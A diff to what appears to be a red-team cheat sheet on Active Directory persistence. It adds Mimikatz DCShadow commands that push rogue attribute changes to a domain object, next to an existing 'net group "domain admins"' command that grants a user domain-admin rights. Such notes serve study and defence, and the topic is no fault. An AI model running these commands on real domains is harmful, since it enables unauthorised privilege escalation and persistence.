@@ -12,6 +12,9 @@ net group "domain admins" John /add /domain
 ```
 
 ###  DCShadow Persistent
-```
 DCShadow is a persistence technique which is  allowing an attacker to push malicious changes into the environment by modifying active directory objects.domain privileges is requiredto carry out this attack
+```
+lsadump::dcshadow /object:John-PC$ /attribute:badpwdcount /value=7777
+lsadump::dcshadow /push
+
 ```
